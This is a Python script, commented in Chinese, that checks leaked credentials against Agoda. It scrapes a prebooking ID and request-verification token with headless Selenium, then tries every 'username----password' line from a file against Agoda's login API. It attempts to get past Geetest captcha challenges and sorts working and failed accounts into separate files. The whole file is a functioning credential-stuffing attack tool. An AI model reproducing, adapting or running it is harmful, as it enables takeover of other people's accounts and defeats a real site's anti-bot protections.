from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import WebDriverException
import time
import re
from bs4 import BeautifulSoup
from requests.exceptions import ConnectionError
import requests
import json
import os


def get_token_id():
    """
    获取电影的id
    :param url:
    :return:
    """
    chrome_options = Options()
    chrome_options.add_argument('--headless')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('log-level=3')

    driver = webdriver.Chrome(executable_path=r'E:\SDE\webdriver\chromedriver2.38.exe')
    # driver = webdriver.Chrome(executable_path=r'E:\SDE\webdriver\chromedriver2.38.exe', chrome_options=chrome_options)

    driver.implicitly_wait(50)
    # 请求网页
    driver.get(url='https://www.agoda.com/zh-cn/?cid=-999')
    inputs = driver.find_element_by_class_name("SearchBoxTextEditor")
    inputs.send_keys('杭州')

    select_btn = driver.find_element_by_xpath('//li[@data-text="杭州"]')
    select_btn.click()
    driver.execute_script('''$('[data-element-name="occupancy-box"]').click()''')
    driver.execute_script('''$('[data-element-name="traveler-solo"]').click()''')
    time.sleep(1)
    click_js = '''$('[data-selenium="searchButton"]').click()'''
    driver.execute_script(click_js)

    # 打开酒店详情
    hotel_href = driver.find_element_by_xpath('//a[@data-hotelid]')
    # 酒店连接
    hotel_link = hotel_href.get_attribute("href")

    # 订单页面的循环
    # 新页面
    driver.get(url=hotel_link)

    time.sleep(1)
    driver.execute_script('''$('[data-selenium="ChildRoomsList-bookButtonInput"]').click()''')

    # data-encrypted-prebooking-id
    # name="__RequestVerificationToken"
    encrypted = driver.find_element_by_xpath('//meta[@data-encrypted-prebooking-id]')
    token = driver.find_element_by_name('__RequestVerificationToken')
    en_id = encrypted.get_attribute('data-encrypted-prebooking-id')
    tok = token.get_attribute('value')
    print(en_id)
    print(tok)
    driver.close()
    driver.quit()
    return en_id, tok


def login(file_path):
    # 需要验证的账号保存位置
    file = open(file_path, 'r')
    # 验证成功的账号保存位置
    success_file = open('验证成功.txt', 'a+')
    # 验证失败后的账号保存位置
    erro_file = open('验证失败.txt', 'a+')
    # 用来记录程序终端的读取位置！
    temp_file_path = '%s.tmp' % file_path

    while True:
        # 程序中断后记录中断的为hi在
        if os.path.isfile(temp_file_path):
            temp_file = open(temp_file_path, 'r+')
            file.seek(int(temp_file.readlines()[-1]))
        else:
            temp_file = open(temp_file_path, 'w+')

        # encrypted, token = get_token_id()
        encrypted, token = ['F1106FE1A2E2944F179543FD39BFB2BA',
                            '6Jnb51y--uN3Ixjo3Z_yJ6yBtVFHq0Ea17emuyuIK-jZs8zKAOkhj4NAuRELhX_NeTX0RJ_5jpRhVJeFrCGwwf7lBNc1']
        headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
            'x-request-verification-token': token,
            'x-requested-with': 'XMLHttpRequest',
        }
        user_row = file.readline().strip()
        temp_file.write('%s\n' % file.tell())
        if not user_row:
            break
        username, password, *_ = user_row.split('----')

        session = requests.Session()
        date1 = {
            'encryptedPrebookingId': encrypted,
            'username': username,
            'password': password,
            'captchaResponse[challenge]': '',
            'captchaResponse[validate]': '',
            'captchaResponse[secCode]': '',
            'isPhoneNumberLogin': 'false'
        }
        date2 = {
            'encryptedPrebookingId': encrypted,
            'username': username,
            'password': password,
            'captchaResponse[challenge]': '',
            'captchaResponse[validate]': '__',
            'captchaResponse[secCode]': '__|jordan',
            'isPhoneNumberLogin': 'false'
        }
        response = session.post(url='https://secure.agoda.com/zh-cn/api/member/login/?ori=CN&siteId=-999&dc=HKG',
                                headers=headers, data=date1)
        json_data = json.loads(response.text)
        if json_data['action'] == 100:
            print('[SUCCESS]验证成功：', user_row)
            success_file.write('%s\n' % user_row)
            success_file.flush()

        elif json_data['action'] == 302:
            challenge = re.findall(r'"challenge":"(.*?)"', json_data['captcha']['geetest'])[0]
            date2['captchaResponse[challenge]'] = challenge
            response2 = session.post(
                url='https://secure.agoda.com/zh-cn/api/member/login/?ori=CN&siteId=-999&dc=HKG', headers=headers,
                data=date2)
            json_data2 = json.loads(response2.text)
            if json_data2['action'] == 100:
                print('[SUCCESS]XX验证成功：', user_row)
                success_file.write('%s\n' % user_row)
                success_file.flush()
            elif json_data2['action'] == 300:
                print('[ERRO]XX验证失败[%s]：' % json_data2['errorMessage'], user_row)
                erro_file.write('%s\n' % user_row)
                erro_file.flush()
            elif json_data2['action'] == 302:
                print('又特么是验证码！')
        elif json_data['action'] == 300:
            print('[ERRO]验证失败[%s]：' % json_data['errorMessage'], user_row)
            erro_file.write('%s\n' % user_row)
            erro_file.flush()

    os.remove(temp_file_path)
    success_file.close()
    erro_file.close()
    w = '''
    **************************************************************************

                                程序执行完毕！
                        验证成功的账号：%s
                        验证失败的账号：%s

    *************************************************************************
    ''' % ('验证成功.txt', '验证失败.txt')
    print(w)


if __name__ == '__main__':
    login('zh.txt')
